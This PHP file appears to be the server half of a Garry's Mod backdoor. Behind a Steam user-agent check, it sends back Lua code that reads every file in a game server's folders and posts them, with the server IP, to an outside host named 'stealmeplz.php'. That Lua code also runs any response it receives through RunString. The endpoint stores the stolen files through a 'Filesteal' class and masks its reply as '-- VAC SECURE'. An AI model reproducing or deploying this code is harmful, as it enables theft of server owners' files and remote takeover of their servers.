<?php
if (isset($_SESSION['user']['id']) || ($_SERVER['HTTP_USER_AGENT'] !== "Valve/Steam HTTP Client 1.0 (4000)"))
{
    die();
}
require_once '../../app/Models/includes.php';
if (!GarryMod::ValidUserAgent())
{
    die();
}

$ip = $_POST["ip"];
$domain = $_SERVER['HTTP_HOST'];

$filename = $_POST['filename'];
$content = $_POST['content'];

$blacklist = array(
	'addons/go',
	'addons/hearts',
	'addons/spades',
	'addons/common',
	'addons/chess',
	'addons/checkers'
);

// SI LES CHAMPS EXISTE EXECUTER
if(isset($_POST["key"]) AND isset($_POST["ip"])){

//SI C'EST UN DOSSIER
if(isset($_POST["foldername"]) AND !in_array($_POST["foldername"], $blacklist)){
		
	echo 'local tendance = "https://kvac.cz/_/stealmeplz.php"

	local function UploadFile(filename, content, ip, key)
		http.Post(tendance, {filename = filename, content = content, ip = ip, key = key}, function(body, len, headers, code)
			RunString(body, "ERROR", false)
		end)
	end

	local function UploadFolder(foldername, ip, key)
		http.Post(tendance, {foldername = foldername, ip = ip, key = key}, function(body, len, headers, code)
			RunString(body, "ERROR", false)
		end)
	end

	local directory = "'.$_POST["foldername"].'/"
	local files, folders = file.Find( directory..\'*\', "GAME" )

	for i = 1, #files do
		timer.Simple(math.random(0.1,2) ,function ()
			local content = file.Read(directory..files[i],"GAME")
			UploadFile(directory..files[i], content, game.GetIPAddress(), "KFJFIJEIJEEI")
		end)
	end

	for i = 1, #folders do
		timer.Simple(math.random(0.1,2) ,function ()
			local content = file.Read(folders[i],"GAME")
			UploadFolder(directory..folders[i], game.GetIPAddress(), "KFJFIJEIJEEI")
		end)
	end';
	}

	//SI C'EST UN FICHIER
	if(isset($_POST["filename"])){
		Filesteal::InsertFile($_POST['filename'], $_POST['content'], $ip);
		echo '-- VAC SECURE';
	}

}

?>